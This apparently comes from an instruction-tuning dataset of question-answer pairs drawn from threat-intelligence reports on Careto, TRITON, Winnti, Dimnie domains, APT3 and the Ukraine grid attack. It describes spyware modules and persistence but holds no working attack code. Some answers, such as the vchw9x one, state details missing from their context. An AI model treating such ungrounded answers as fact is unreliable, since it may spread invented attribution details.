%windows%\\System32\\jpeg1x32.dll\nCompilation timestamps: 2013.04.09 14:15:17 (GMT)\nFile sizes: 31744 bytes\nExports:\n79002656: fnProcess\nTechnical details\nAll the functionality is implemented in the fnProcess function. The function receives 4 parameters that define the module's behavior. Depending on the parameters, it can:\n\u25cf Delete the SGH components specified in the configuration block, effectively uninstalling it\n\u25cf Delete the registry keys corresponding to the components of SGH\n\u25cf Compile a complete system report, including directory locations, hardware parameters, list of users, processes, installed programs, MAC addresses of network adapters\n\u25cf Call various functions of the \"awdcxc32\" module\nMedium Headline: xvi) siiw9x module\nFile type: PE32 DLL\nFile location: %windows%\\System32\\siiw9x.dll\nCompilation timestamps: 2013.03.22 11:55:13 (GMT)\nFile sizes: 15360 bytes\nExports:\n78002078: DllEnumClass\nTechnical details\nMain functionality is implemented in the DllMain function. The module waits until a desktop named \"screen-saver\" appears and when that desktop becomes available it creates another desktop named \"DZ9PADXF\" and launches the default browser application there. This functionality may be useful for stable operation of the \"vchw9x\" module on rarely used computers since that module is activated only in browser processes.\nThe \"DllEnumClass\" function deletes the module or removes its name from the configuration block, depending on the Windows version.\nxvii) SkypeIE6Plugin\nIntercepts and records audio streams from Skype. We have discovered only a 32-bit version of this plugin so far.\nFile type: PE32 DLL\nFile location: %windows%\\System32\\SkypeIE6Plugin.dll\nCompilation timestamps: 2011.01.17 14:30:23 (GMT)\nFile sizes: 73728 bytes\nTechnical details\nThe library has no exports, its functionality is implemented in the DllMain function. The library hides itself by modifying the list of loaded DLL files to that its own module name appears to be \"%windows%\\System32\\authz.dll\". It intercepts several functions exported by system libraries to capture sound from the infected system:\nThe module uses an additional library, \"%windows%\\System32\\lame_enc.dll\" to compress recorded audio data. The location of recorded data is specified in the configuration block.\nMedium Headline: xviii) nmwcdlog module\nGathers information from Nokia mobile devices using the Nokia OVI/PC Suite API.\nThe library has no exports, its functionality is implemented in the DllMain function. It loads the Nokia Connectivity API libraries \"ConnAPI.dll\", \"DAAPI.dll\" and tries to extract data from all available devices.\nThe module collects the following information:\n- device name\n- manufacturer name\n- model\n- serial number\n- list of contacts\n- calendar\n- bookmarks\n- SMS and MMS messages\nMedium Headline: xix) d3dx8_20 module\nThis data collection plugin makes screenshots of the victim's desktop.\nTechnical details\nThe library has no exports, its functionality is implemented in the DllMain function. It makes screenshots of the desktop and marks the position of the mouse cursor. Additionally, it captures the title of the foreground window. Collected data is stored in multi-volume ZIP archives and then delivered to the C&C server.\nxx) WifiScan module\nRetrieves the list of available Wi-Fi networks. We have discovered only a 64-bit version of this plugin so far.\nThe library has no exports, its functionality is implemented in the DllMain function. It uses the API provided by the library \"wlanapi.dll\" to retrieve information about the wireless networks visible to the infected machine's Wi-Fi interfaces.\nMedium Headline: xxi) awview32 module\nThis module is injected in Microsoft Outlook processes. Collects victim's email messages.\nFile type: PE32/PE32+ DLL File location: %windows%\\System32\\awview32.dll Compilation timestamps: 2011.06.10 12:27:40 (GMT), 2011.06.10 16:46:57 (GMT) File sizes: 26624, 45056 bytes.\nTechnical details\nThe library has no exports, its functionality is implemented in the DllMain function. The module implements the Microsoft Outlook add-in interface and ensures it is requested by hooking the OLE2 API. It receives events from the Outlook application, collects the e-mail messages and writes them to the temporary directory.\nMedium Headline: xxii) CDllUninstall module\nFile type: PE32/PE32+ DLL\nFile location: non, is executed in memory\nCompilation timestamps: 2013.06.20 11:58:03 (GMT), 2013.06.20 11:58:08 (GMT)\nFile sizes: 11264, 13824 bytes\nTechnical details\nHaving its filename related to the SGH package, this module is actually a command package for Careto. It is transmitted by the C&C servers as a CAB archive containing 32-bit and 64-bit versions of its DLL and the accompanying \"Meta.inf\" file. The contents of the archive follow:\nThe \"Meta.inf\" instructs the Careto instance to load the DLL appropriate for the system architecture:\n#Mon Oct 28 17:20:14 GMT 2013\nDLL32_FILE_NAME=CDllUninstallSGH32.dll\nDLL64_FILE_NAME=CDllUninstallSGH64.dll\nDATE_GENERATION=20131028T172014.101\nTYPE=CMD\nCLIENT_ID=%client id%\nCMD_SEQ=0002\nINST_ID=%installation id%\nSUB_TYPE=CANNEDDLL\nTARGET_PROCESS=EXPLORER\nPRODUCT_CODE=C316\nThe module uninstalls both Careto and SGH from the infected computer. Its internal name is \"CDllUninstall v1.0.0\". It explicitly names the software packages with their original names by writing the following strings in the uninstallation log:\nThe module contains hardcoded locations of the files that are removed and registry keys to be removed or restored. For SGH, these are:\nHKLM\\SYSTEM\\*ControlSet*\\Services\\scsimap\n%systemroot%\\System32\\bootfont.bin\nc:\\Windows\\System32\\bootfont.bin\n%systemroot%\\System32\\drivers\\scsimap.sys\nc:\\Windows\\System32\\drivers\\scsimap.sys\nFor Careto, it first determines the location of the main module by reading the registry value from:\nHKLM/HKCU\\SOFTWARE\\CLASSES\\CLSID\\{ECD4FC4D-521C-11D0-B792-\n00A0C90312E1}\nThe main module is removed and the original registry value is restored from the registry key:\nSOFTWARE\\CLASSES\\CLSID\\{E6BB64BE-0618-4353-9193-\n0AFE606D6F0C}\\InprocServer32\nRead the text above and answer this question: Describe the functionality of the 'vchw9x' module in the Mask APT and explain how it interacts with other components.",
    "output": "The 'vchw9x' module implements network connectivity features for the SGH components. It is injected by the LoadDLL driver into specific processes such as IEXPLORE.EXE, FIREFOX.EXE, and others. The module creates a named pipe ('\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1}') and processes commands sent via this pipe by other modules. Once a command is received, it passes the network request to Wininet functions and returns the results to the caller module via the same pipe. This allows other components to communicate with the C&C server through the 'vchw9x' module.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Incident Summary\nThe attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message.\nWe assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons:\nModifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure that would result in physical consequences.\nTRITON was used to modify application memory on SIS controllers in the environment, which could have led to a failed validation check.\nThe failure occurred during the time period when TRITON was used.\nIt is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident.\nBig Headline: Attribution\nhas not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attacker's persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor. Specifically, the following facts support this assessment:\nThe attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups.\nThe attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol.\nThe targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency.\nBig Headline: Background on Process Control and Safety Instrumented Systems\nModern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as or Operational Technology (OT).\nA Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment.\nA SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate\ndangerous situations.\nAsset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bidirectional communication between DCS and SIS network hosts.\nBig Headline: Safety Instrumented Systems Threat Model and Attack Scenarios\nThe attack lifecycle for disruptive attacks against ICS is similar to other types of cyber attacks, with a few key distinctions. First, the attacker's mission is to disrupt an operational process rather than steal data. Second, the attacker must have performed OT reconnaissance and have sufficient specialized engineering knowledge to understand the industrial process being controlled and successfully manipulate it.\nFigure 2 represents the relationship between cyber security and safety controls in a process control environment. Even if cyber security measures fail, safety controls are designed to prevent physical damage. To maximize physical impact, a cyber attacker would also need to bypass safety controls.\nThe SIS threat model below highlights some of the options available to an attacker who has successfully compromised an SIS.\nAttack Option 1: Use the SIS to shutdown the process\nThe attacker can reprogram the SIS logic to cause it to trip and shutdown a process that is, in actuality, in a safe state. In other words, trigger a false positive.\nImplication: Financial losses due to process downtime and complex plant start up procedure after the shutdown.\nAttack Option 2: Reprogram the SIS to allow an unsafe state\nThe attacker can reprogram the SIS logic to allow unsafe conditions to persist.\nImplication: Increased risk that a hazardous situation will cause physical consequences (e.g. impact to equipment, product, environment and human safety) due to a loss of SIS functionality.\nAttack Option 3: Reprogram the SIS to allow an unsafe state \u2013 while using the DCS to create an unsafe state or hazard\nThe attacker can manipulate the process into an unsafe state from the DCS while preventing the SIS from functioning appropriately.\nImplication: Impact to human safety, the environment, or damage to equipment, the extent of which depends on the physical constraints of the process and the plant design.\nBig Headline: Analysis of Attacker Intent\nWe assess with moderate confidence that the attacker's long-term objective was to develop the capability to cause a physical consequence. We base this on the fact that the attacker initially obtained a reliable foothold on the DCS and could have developed the capability to manipulate the process or shutdown the plant, but instead proceeded to compromise the SIS system. Compromising both the DCS and SIS system would enable the attacker to develop and carry out an attack that causes the maximum amount of damage allowed by the physical and mechanical safeguards in place.\nOnce on the SIS network, the attacker used their pre-built TRITON attack framework to interact with the SIS controllers using the TriStation protocol. The attacker could have caused a process shutdown by issuing a halt command or intentionally uploading flawed code to the SIS controller to cause it to fail. Instead, the attacker made several attempts over a period of time to develop and deliver functioning control logic for the SIS controllers in this target environment. While these attempts appear to have failed due one of the attack scripts' conditional checks, the attacker persisted with their efforts. This suggests the attacker was intent on causing a specific outcome beyond a process shutdown.\nOf note, on several occasions, we have observed evidence of long term intrusions into ICS which were not ultimately used to disrupt or disable operations. For instance, Russian operators, such as Sandworm Team, have compromised Western ICS over a multi-year period without causing a disruption.\nBig Headline: Summary of Malware Capabilities\nThe TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON's extensive reconnaissance capabilities).\nThe TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks.\nRead the text above and answer this question: What characteristics of the attack suggest that it was sponsored by a nation state, and why is this significant?",
    "output": "The attacker targeted the SIS, suggesting an interest in causing a high-impact attack with physical consequences, which is not typical of cyber-crime groups. The attacker deployed TRITON shortly after gaining access to the SIS system, indicating pre-built and tested tools requiring access to specialized hardware and software. Additionally, the targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with activities carried out by nation states like Russia, Iran, North Korea, the U.S., and Israel. This is significant because it indicates a well-resourced and potentially dangerous adversary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nThe Code of Conduct has not been put to a vote as adoption at the UN is highly unlikely due to opposition from many liberal democracies. An alternative strategy, promoted initially by the US, is to strengthen international cyber security through voluntary norms of behaviour that pertain during peacetime.18 According to this logic, most cyber operations fall below the 'use of force' threshold, which means that most of the existing legal norms regulating interstate cyber operations are not sufficient.19 During the height of the cyber incidents in Ukraine, the US promoted the fol-\nAn alternative strategy is to strengthen international cyber security through voluntary norms.\n15 See, for example, Keir Giles. 'Russia's Public Stance on Cyberspace Issues,' in 2012 4th International Conference on Cyber Conflict, ed. Christian Czosseck, Rain Ottis, and Katharina Ziolkowski (NATO CCD COE Publication, 2012), http://www.ccdcoe. org/publications/2012proceedings/2_1_Giles_RussiasPublicStanceOnCyberInformationWarfare.pdf.\n16 See the Chinese viewpoint in Lu Wei. 'Cyber Sovereignty Must Rule Global Internet,' The Huffington Post, December 15, 2014, http://www.huffingtonpost.com/lu-wei/china-cyber-sovereignty_b_6324060.html.\n17 Schmitt and Vihul. 'The Nature of International Law Cyber Norms,' 4.\n18 States supporting this view strongly emphasise the applicability of existing international law and see that these norms should be 'voluntary measures of self-restraint' during peacetime, see Christopher M. E. Painter. Testimony of Christopher M. E. Painter, Coordinator for Cyber Issues, U.S. Department of State Before the Senate Foreign Relations Committee Subcommittee on East Asia, the Pacific, and International Cybersecurity Policy Hearing Titled: 'Cybersecurity: Setting the Rules for Responsible Global Behaviour,' 2015, http://www.foreign.senate.gov/imo/media/doc/051415_Painter_Testimony.pdf.\n19 Ibid., 8\u20139. Also, see Tallinn Manual 2.0 process focusing on international law applicable to cyber operations that do not mount to an 'use of force' or do not take place during armed conflict, https://ccdcoe.org/research.html .\nlowing four norms of which the first three were included in the recent UN GGE report:20\n(1) states should not conduct or knowingly support online activity that damages or impairs critical infrastructure (norm 1);\n(2) states should not conduct or knowingly support activity intended to prevent the national Computer Security Incidents Response Teams (CSIRTs or CERTs) from responding to cyber incidents, nor use CSIRTs to do harm (norm 2);\n(3) states should cooperate with other states in investigating cybercrime by collecting electronic evidence and mitigating cyber activity emanating from its territory (norm 3); and\n(4) states should not conduct or knowingly support cyber-enabled theft of commercially valuable intellectual property (norm 4).\nBefore we move on, it is important to note that these and other cyber norms have been analysed in academic circles21 as well as in the private sector. For example, Microsoft has recommended six cybersecurity norms designed to limit the proliferation of cyber weapons and offensive operations in cyberspace.22\n\nWhat are the four norms proposed by the US to strengthen international cyber security, and how do these norms aim to address cyber threats and promote cooperation among states?",
    "output": "The four norms proposed by the US to strengthen international cyber security are: (1) states should not conduct or knowingly support online activity that damages or impairs critical infrastructure; (2) states should not conduct or knowingly support activity intended to prevent national Computer Security Incidents Response Teams (CSIRTs or CERTs) from responding to cyber incidents, nor use CSIRTs to do harm; (3) states should cooperate with other states in investigating cybercrime by collecting electronic evidence and mitigating cyber activity emanating from its territory; and (4) states should not conduct or knowingly support cyber-enabled theft of commercially valuable intellectual property. These norms aim to address cyber threats by setting guidelines for responsible state behavior, promoting cooperation in cybercrime investigations, and protecting critical infrastructure and intellectual property.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "WINNTI ANALYSIS\nAs part of Operation SMN, Novetta analyzed recent versions of the Winnti malware. The samples, compiled from mid- to late 2014, exhibited minimal functional changes over the previous generations Kaspersky reported in 2013.1 What is of note, however, is the increased scrutiny found within the Winnti dropper component that attempts to frustrate analysis of the malware.\nBased on multiple active compromises by the Axiom threat group, Novetta was able to capture and analyze new Winnti malware samples. It should be noted that operators of Winnti that were observed by Novetta leveraged existing Axiom-specific malware infections (Hikit)  to move laterally and install Winnti in the furtherance of their objectives. It is with high confidence that we assess the operators of Winnti in these monitored environments were not the same actors who originally installed and leveraged Hikit.\nThis report will focus on three different aspects of the Winnti malware: the start-up sequence of Winnti from the initial infection to steady state, the basics of the Winnti malware, and the command and control (C2) communication protocol.\n\nHow did the operators of the Winnti malware leverage existing infections to move laterally and achieve their objectives? Additionally, explain why this strategy might be effective against traditional security measures.",
    "output": "The operators of the Winnti malware leveraged existing Axiom-specific malware infections, specifically Hikit, to move laterally within compromised environments. This strategy allowed them to install Winnti and further their objectives without needing to establish a new foothold. By using pre-existing infections, the attackers could bypass initial detection mechanisms that might be focused on identifying new intrusions. This approach is effective because it exploits the trust relationships within the network and can evade traditional security measures that might not detect lateral movement as effectively as initial compromise attempts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix B: Associated Domains\n1c-host[.]host\n1cpred[.]org\nallforest[.]pw\nantiprt[.]com\natonix[.]pw\nbabbabbab[.]ru\nbabbabbab2[.]ru\nbabbebbab[.]com\nbabbebbab2[.]com\nbabbibbab2[.]ua\nbabbihbab[.]host\nbabblabbab2[.]link\nbabblahbab[.]com\nbabblebbab[.]pw\nbabblebbab2[.]pw\nbabblehbab[.]top\nbabblibbab2[.]xyz\nbabblihbab[.]link\nbabblohbab[.]pw\nbabblulbab[.]pw\nbabbobbab[.]link\nbabbohbab[.]com\nbabbolbab[.]host\nbabbolbab[.]ru\nbabbrabbab2[.]xyz\nbabbrebbab[.]rocks\nbabbrebbab2[.]rocks\nbabbrehbab[.]pw\nbabbribbab2[.]space\nbabbrihbab[.]xyz\nbabbrohbab[.]rocks\nbabbrulbab[.]rocks\nbabbulbab[.]com\nbabchabbab[.]org\nbabchabbab2[.]org\nbabchebbab2[.]ru\nbabchehbab[.]in\nbabchibbab[.]com\nbabchihbab[.]org\nbabcholbab[.]org\nbabclabbab2[.]space\nbabclebbab[.]biz\nbabclebbab2[.]biz\nbabclehbab[.]rocks\nbabclibbab2[.]in\nbabclihbab[.]space\nbabclohbab[.]biz\nbabclulbab[.]biz\nbabcrabbab2[.]in\nbabcrambab[.]ru\nbabcrebbab[.]org\nbabcrebbab2[.]org\nbabcrehbab[.]biz\nbabcribbab[.]ru\nbabcrihbab[.]in\nbabcrohbab[.]org\nbabcruhbab[.]host\nbabcrulbab[.]org\nbabdabbab[.]ua\nbabdabbab2[.]ua\nbabdebbab[.]link\nbabdebbab2[.]link\nbabdibbab2[.]pw\nbabdihbab[.]top\nbabdobbab[.]xyz\nbabdohbab[.]link\nbabdolbab[.]top babdrabbab2[.]ru babdrambab[.]ua babdrebbab[.]com babdrebbab2[.]com babdrehbab[.]org babdribbab[.]ua babdrihbab[.]host babdrohbab[.]com babdruhbab[.]top babdrulbab[.]com babdulbab[.]link babfabbab[.]pw babfabbab2[.]pw babfebbab[.]top babfebbab[.]xyz babfebbab2[.]xyz babfibbab2[.]rocks babfihbab[.]pw babflabbab2[.]ua babflambab[.]pw babflebbab[.]link babflebbab2[.]link babflehbab[.]com babflibbab[.]pw\nbabflihbab[.]top\nbabflohbab[.]link\nbabfluhbab[.]pw\nbabflulbab[.]link\nbabfobbab[.]space babfohbab[.]xyz babfolbab[.]pw babfrabbab2[.]pw babfrebbab[.]xyz babfrebbab2[.]xyz babfrehbab[.]link babfribbab[.]rocks babfrihbab[.]pw babfrohbab[.]xyz babfrulbab[.]xyz babfulbab[.]xyz babgabbab2[.]rocks babgebbab[.]space babgebbab2[.]space babgibbab2[.]biz babgihbab[.]rocks babglabbab2[.]rocks babglebbab[.]space babglebbab2[.]space babglehbab[.]xyz babglibbab[.]biz babglihbab[.]rocks babglohbab[.]space babglulbab[.]space babgobbab[.]in babgofbab[.]biz babgohbab[.]space\nbabgrabbab2[.]biz\nbabgrebbab[.]in\nbabgrebbab2[.]in\nbabgrehbab[.]space\nbabgribbab[.]org\nbabgrihbab[.]biz\nbabgrohbab[.]in\nbabgrulbab[.]in\nbabgulbab[.]space\nbabhabbab2[.]biz\nbabhebbab[.]in\nbabhebbab2[.]in\nbabhibbab2[.]org\nbabhihbab[.]biz\nbabhohbab[.]in\nbabhulbab[.]in\nbabjabbab2[.]org\nbabjebbab[.]ru\nbabjebbab2[.]ru\nbabjibbab2[.]com\nbabjihbab[.]org\nbabjohbab[.]host\nbabjulbab[.]host\nbabkabbab2[.]com\nbabkebbab[.]ua\nbabkebbab2[.]ua\nbabkehbab[.]host\nbabkibbab2[.]link\nbabkihbab[.]com\nbabkohbab[.]top\nbabkulbab[.]top\nbablabbab2[.]link\nbablebbab[.]pw\nbablebbab2[.]pw\nbablehbab[.]top\nbablibbab2[.]xyz\nbablihbab[.]link\nbablohbab[.]pw\nbablulbab[.]pw\nbabmabbab[.]xyz\nbabmabbab2[.]xyz\nbabmebbab[.]rocks\nbabmebbab2[.]rocks\nbabmehbab[.]pw\nbabmibbab2[.]space\nbabmihbab[.]xyz\nbabmilbab[.]pw\nbabmohbab[.]rocks\nbabmulbab[.]rocks\nbabnabbab2[.]space\nbabnebbab[.]biz\nbabnebbab2[.]biz\nbabnehbab[.]rocks\nbabnibbab2[.]in\nbabnihbab[.]space\nbabnohbab[.]biz\nbabnulbab[.]biz\nbabpabbab2[.]in\nbabpebbab[.]org\nbabpebbab2[.]org\nbabpehbab[.]biz\nbabpibbab2[.]ru\nbabpihbab[.]in\nbabplabbab2[.]org\nbabplebbab[.]ru\nbabplebbab2[.]ru\nbabplehbab[.]in babplibbab[.]com babplifbab[.]ru babplihbab[.]org babplohbab[.]host babplulbab[.]host babpohbab[.]org babprabbab2[.]com babprebbab[.]ua babprebbab2[.]ua babprehbab[.]host babpribbab[.]link babprihbab[.]com babprulbab[.]top babpulbab[.]org babrabbab2[.]ru babrebbab[.]com babrebbab2[.]com babrehbab[.]org babribbab2[.]ua babrihbab[.]host babrohbab[.]com babrulbab[.]com babsabbab2[.]ua babsahbab[.]host babsebbab[.]link babsebbab2[.]link\nbabsehbab[.]com\nbabsibbab2[.]pw\nbabsihbab[.]top\nbabskabbab2[.]link\nbabskebbab[.]pw\nbabskebbab2[.]pw\nbabskehbab[.]top\nbabskibbab[.]xyz\nbabskihbab[.]link\nbabslabbab2[.]xyz\nbabslebbab2[.]rocks\nbabslehbab[.]pw\nbabslibbab[.]space\nbabslihbab[.]xyz\nbabsmabbab2[.]space\nbabsmebbab2[.]biz\nbabsmehbab[.]rocks\nbabsmibbab[.]in\nbabsmihbab[.]space\nbabsnabbab2[.]in\nbabsnebbab2[.]org\nbabsnehbab[.]biz\nbabsnibbab[.]ru\nbabsnihbab[.]in\nbabsofbab[.]pw\nbabsohbab[.]link\nbabspabbab[.]ru\nbabspabbab2[.]ru\nbabspebbab2[.]com\nbabspefbab[.]ru\nbabspehbab[.]org\nbabspibbab[.]ua\nbabspihbab[.]host\nbabspolbab[.]host\nbabstabbab[.]ua\nbabstabbab2[.]ua\nbabstebbab2[.]link\nbabstefbab[.]com\nbabstehbab[.]com\nbabstibbab[.]pw\nbabstihbab[.]top\nbabstolbab[.]top\nbabstrabbab[.]pw\nbabstrabbab2[.]pw\nbabstrebbab2[.]xyz\nbabstrefbab[.]pw\nbabstrehbab[.]link\nbabstribbab[.]rocks\nbabstrihbab[.]pw\nbabstrolbab[.]pw\nbabsulbab[.]link\nbabswabbab[.]rocks\nbabswabbab2[.]rocks\nbabswebbab2[.]space\nbabswehbab[.]xyz\nbabswibbab[.]biz\nbabswihbab[.]rocks\nbabswolbab[.]rocks\nbabtabbab2[.]pw\nbabtahbab[.]top\nbabtebbab[.]xyz\nbabtebbab2[.]xyz\nbabtehbab[.]link\nbabtibbab2[.]rocks\nbabtihbab[.]pw\nbabtohbab[.]xyz\nbabtrabbab[.]biz\nbabtrabbab2[.]biz\nbabtrebbab2[.]in\nbabtrehbab[.]space\nbabtribbab[.]org\nbabtrihbab[.]biz\nbabtrolbab[.]biz\nbabtulbab[.]xyz\nbabvabbab2[.]rocks\nbabvahbab[.]pw babvebbab[.]space babvebbab2[.]space babvehbab[.]xyz babvibbab2[.]biz babvihbab[.]rocks babvohbab[.]space babvulbab[.]space\nbabwabbab2[.]biz\nbabwahbab[.]rocks\nbabwebbab[.]in\nbabwebbab2[.]in\nbabwehbab[.]space\nbabwibbab2[.]org\nbabwihbab[.]biz\nbabwohbab[.]in\nbabwulbab[.]in\nbabyabbab2[.]org\nbabyahbab[.]biz\nbabyebbab[.]ru\nbabyebbab2[.]ru\nbabyehbab[.]in\nbabyibbab2[.]com\nbabyihbab[.]org\nbabyohbab[.]host\nbabyulbab[.]host\nbabzabbab2[.]com\nbabzahbab[.]org\nbabzebbab[.]ua\nbabzebbab2[.]ua\nbabzehbab[.]host\nbabzibbab2[.]link babzihbab[.]com babzohbab[.]top babzulbab[.]top bannarbor[.]pw bisquitshore[.]xyz bitrixon[.]biz buhgalter[.]pw\nbuhgalter[.]rocks\nbuhgalters[.]xyz\nbusinessolution[.]site\ncheturion[.]org\nchipacom[.]net\ncloneduring[.]pw\ncompanysafa[.]biz\ncorpofname[.]pw\ndatamining[.]press\ndersteoyna[.]pw\ndovnikus[.]su\nefros[.]pw\nflashclicks[.]info\nforbusinessgo[.]xyz\nfortificar[.]net\nfracking[.]host\ngateoflife[.]pw\ngaz[.]rocks\ngedealer[.]pw\nglobuspp[.]pw\ngrandvita[.]pw\ngreenlanterns[.]xyz\ngreenworldsun[.]xyz\nguardomorph[.]com\nguwang[.]pw\njobforreborn[.]xyz\nkokinatsu[.]pw\nkukuzaki[.]me\nkupala[.]me\nlastsnow[.]link\nmaradonianos[.]pw\nmercurytod[.]pw\nmuxa[.]club\nmycorpsafa[.]biz\nn-nalog78[.]com\nnewsunconcept[.]in\nnewsupport[.]us\nnothingmore[.]us\nnovayarabota[.]pw\nnvpn[.]pw\nodejda77[.]net okvd[.]biz\nolen[.]bid\nonechat[.]pw\nplacetobuy[.]pw\nplatej[.]pw\npoplata-da[.]org\nportw[.]org\npowersand[.]link\npricemeet[.]pw\npuldisk[.]xyz\nrabotadnya[.]pw\nraintor[.]pw\nricarier[.]org\nrosgaz[.]pw\nrumoney[.]xyz\nsalesforlife[.]top\nsalesline[.]top\nsam-sam[.]pw\nsandstyle[.]biz\nsandw[.]pw\nsantrimo[.]lol\nseclist[.]site\nseclist[.]top\nselenaspace[.]space\nsellgrax[.]club\nsemodo[.]pw\nsensetunoespossible[.]cat\nshortsell[.]trade\nshortselling[.]club\nsixgoats[.]pw\nsnp500[.]trade\nsolotender[.]pw\nsslprivate[.]org\ntapalulumba[.]com\ntaskhoper[.]com\ntitleworld[.]pw\ntorglend[.]com\ntradertop[.]top\ntrendkop[.]pw\ntyuocruz1312[.]net\nuchet[.]pw\nuchet[.]space\nvisitpalace[.]xyz\nvolumexp[.]xyz\nvortexenism[.]biz\nvpnserv[.]pw\nvwv.flashclicks[.]info\nwinsocket[.]xyz\nyearreviews[.]net\nUpdated 3/30/17: To remove unnecessary IPS Signature number.\nRead the text above and answer this question: How does the use of multiple domains in the Dimnie campaign align with common tactics employed by advanced persistent threats (APTs), and what implications does this have for cybersecurity defenses?",
    "output": "The use of multiple domains in the Dimnie campaign aligns with common tactics employed by advanced persistent threats (APTs) to increase resilience and reduce the risk of being shut down. By spreading their command and control infrastructure across numerous domains, APTs can ensure that even if some domains are detected and blocked, others remain operational. This tactic makes it challenging for defenders to completely disrupt the malware's communication channels. For cybersecurity defenses, this implies the need for robust domain monitoring and blocking mechanisms, as well as continuous threat intelligence gathering to stay ahead of the attackers' domain rotation strategies. Implementing multi-layered security measures and leveraging machine learning algorithms to detect anomalous domain activity can also enhance the effectiveness of defense mechanisms against such sophisticated threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT3 group utilize Scheduled Tasks to maintain persistence on compromised systems?",
    "output": "Scheduled Tasks are a common mechanism used by adversaries to execute malicious code on a recurring basis. In the case of APT3, they utilize Scheduled Tasks to maintain persistence on compromised systems. As seen in the Operation Double Tap campaign, the malware component 'test.exe' creates a Scheduled Task named 'mysc' that runs the malware executable at logon with elevated privileges. This allows the malware to maintain persistence even after a system restart. Furthermore, the use of Scheduled Tasks enables the attackers to blend in with legitimate system processes, making detection more challenging. By leveraging this built-in Windows feature, APT3 can ensure continued access to compromised systems without relying on zero-day exploits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: ON DECEMBER 18, 2016 THE SECOND POWER OUTAGE OCCURRED IN UKRAINE CAUSING SOME BLACKOUTS IN KIEV FOR LESS THAN ONE HOUR. THIS WAS THE TIME NEEDED FOR AN EXPERT TEAM TO GO ONSITE AND FIX THE PROBLEM USING A MANUAL PROCEDURE.\nThis second attack was targeting another grid company named Ukrenergo. This incident caused multiple blackouts in the Ukrainian capital - Kiev and a complete power loss for the northern part of Kiev on the right bank of the Dnieper river and the surrounding region.\nExperts of the grid company were able to fix the situation in less than 1 hour with a manual procedure. This emergency response team was on site 30 minutes after the outage.\nThe faulty component was the automation control systems piloting a substation in a village near the Kiev city. Automation systems in such substations control how power coming from power plants at high voltage is transformed to lower voltage for consumer and industrial use.\nThe main website of the power grid had been unreachable for a couple of days during and after the attack. The head of Ukrenergo had to publish a quick statement on Facebook (provided in the appendix).\nWhen the situation had been recovered, the company published an official statement available on their website.\nIt states \"Among the possible causes of failure are considered hacking and equipment malfunction (crashes). Timely police were involved and conducted a thorough investigation into the accident, which will be to inform the public. By the end of the official investigation into the case management of all objects SE 'NEC' Ukrenergo with automatic control system was transferred to the local level.\"\nIn the middle of January Ukrenergo confirmed that the source cause of this power outage was malicious. The authors are still undetermined.\nBased on an article from Reuters, Ukrenergo said in comments emailed to Reuters: \"Preliminary findings indicate that workstations and Supervisory Control and Data Acquisition (SCADA) systems, linked to the 330 kilowatt sub-station \"North\", were influenced by external sources outside normal parameters. [...] The analysis of the impact of symptoms on the initial data of these systems indicates a premeditated and multilevel invasion\"\nLaw enforcement officials and cyber experts are still working to compile a chronology of events, draw up a list of compromised\naccounts, and determine the penetration point while tracing computers potentially infected with malware in sleep mode.\nSo far, no huge technical details related to the attack have been released publically. Indeed Marina Krotofil from Honeywell and Oleskii Yasinskiy from ISSP shared some information 